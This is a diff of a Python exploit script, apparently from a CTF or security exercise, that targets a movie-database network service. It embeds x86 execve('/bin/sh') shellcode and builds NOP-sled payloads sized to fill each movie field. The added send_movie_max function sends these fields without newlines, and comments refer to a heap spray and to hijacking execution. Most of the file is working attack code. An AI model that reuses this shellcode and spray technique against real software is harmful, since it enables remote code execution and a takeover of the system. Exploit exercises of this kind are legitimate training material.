@@ -19,6 +19,23 @@ NOP  = "\x90"
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 
+hacker = {"title":"Hackers",
+          "director":"Iain Softley",
+          "star1":"Jonny Lee Miller",
+          "star2":"Angelina Jolie",
+          "star3":"Jessie Bradford",
+          "star4":"Matthew Lillard",
+          "star5":"Laurence Mason",
+          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
+          "country":"USA",
+          "budget":"UNK",
+          "opening_weekend":"UNK",
+          "gross":"$7,564,000",
+          "runtime":"107 min",
+          "aspect":"2.35 : 1",
+          "composer":"Someone",
+          "average_rating":"5.0"}
+
 ################################################################################
 #
 #   pause_script
@@ -61,6 +78,37 @@ def clear_read_buffer(con):
 ################################################################################
 def remove_movie(title,con):
     # Choose the remove option from the main menu
+    #con.send_line("d")
+    con.send("d") 
+    con.send("\n") 
+
+    # Wait for a response
+    time.sleep(1)
+
+    # Clear out the read buffer
+    con.read_one(0)
+    
+    # Send the movie title
+    con.send_line(title)
+
+    # Wait for a response
+    time.sleep(1)
+
+    # Read the response
+    resp = con.read_line()
+
+    # Did we delete the movie?
+    return "Removed movie!" in resp
+
+################################################################################
+#
+#   review_movie
+#
+#   This will review a movie
+#
+################################################################################
+def review_movie(title,con):
+    # Choose the remove option from the main menu
     con.send_line("d")
     
     # Wait for a response
@@ -94,6 +142,7 @@ def send_movie(movie,con):
 
     # Send all the data in order
     con.send_line(movie["title"])
+    pause_script()
     con.send_line(movie["director"])
     con.send_line(movie["star1"])
     con.send_line(movie["star2"])
@@ -109,6 +158,36 @@ def send_movie(movie,con):
     con.send_line(movie["aspect"])
     con.send_line(movie["composer"])
     con.send_line(movie["average_rating"])
+
+################################################################################
+#
+#   send_movie_max
+#
+#   This will add a movie using send instead of send_line, thus not sending 
+#   newlines which messup when we send max length movie fields
+#
+################################################################################
+def send_movie_max(movie,con):
+    # Choose the add option
+    con.send_line("a")
+
+    # Send all the data in order
+    con.send(movie["title"])
+    con.send(movie["director"])
+    con.send(movie["star1"])
+    con.send(movie["star2"])
+    con.send(movie["star3"])
+    con.send(movie["star4"])
+    con.send(movie["star5"])
+    con.send(movie["summary"])
+    con.send(movie["country"])
+    con.send(movie["budget"])
+    con.send(movie["opening_weekend"])
+    con.send(movie["gross"])
+    con.send(movie["runtime"])
+    con.send(movie["aspect"])
+    con.send(movie["composer"])
+    con.send(movie["average_rating"])
 
 ################################################################################
 #
@@ -158,22 +237,22 @@ def build_nop_string(size):
 ################################################################################
 def build_movie():
 
-    title           = build_nop_string(500)
-    director        = build_nop_string(300)
-    star1           = build_nop_string(300)
-    star2           = build_nop_string(300)
-    star3           = build_nop_string(300)
-    star4           = build_nop_string(300)
-    star5           = build_nop_string(300)
-    summary         = build_nop_string(2000)
-    country         = build_nop_string(30)
-    budget          = build_nop_string(80)
-    opening_weekend = build_nop_string(80)
-    gross           = build_nop_string(80)
-    runtime         = build_nop_string(80)
-    aspect          = build_nop_string(40)
-    composer        = build_nop_string(300)
-    average_rating  = build_nop_string(3)
+    title           = build_nop_string(500 - 1)
+    director        = build_nop_string(300 - 1)
+    star1           = build_nop_string(300 - 1)
+    star2           = build_nop_string(300 - 1)
+    star3           = build_nop_string(300 - 1)
+    star4           = build_nop_string(300 - 1)
+    star5           = build_nop_string(300 - 1)
+    summary         = build_nop_string(2000 - 1)
+    country         = build_nop_string(30 - 1)
+    budget          = build_nop_string(80 - 1)
+    opening_weekend = build_nop_string(80 - 1)
+    gross           = build_nop_string(80 - 1)
+    runtime         = build_nop_string(80 - 1)
+    aspect          = build_nop_string(40 - 1)
+    composer        = build_nop_string(300 - 1)
+    average_rating  = build_nop_string(3 - 1)
 
     movie = {           
               "title" : title,
@@ -206,13 +285,21 @@ def build_movie():
 # Start the connection
 con = connect()
 
-# Pause the script until the user presses enter (useful for running under gdb and setting breakpoints)
-pause_script()
+#pause_script()
 
-# Send the movie
-#movie = build_movie()
-#send_movie(hacker, con)
+
+movie = build_movie()
+send_movie(movie, con)
+
+#go_interactive(con)
 
 # Create reviews to amplify the spray
 
 #hijack_execution(con)
+
+#send_movie(hacker,con)
+#if remove_movie("Hackers",con):
+#if remove_movie(build_nop_string(500),con):
+#    print "Deleted!"
+#else:
+#    print "Didn't delete :("
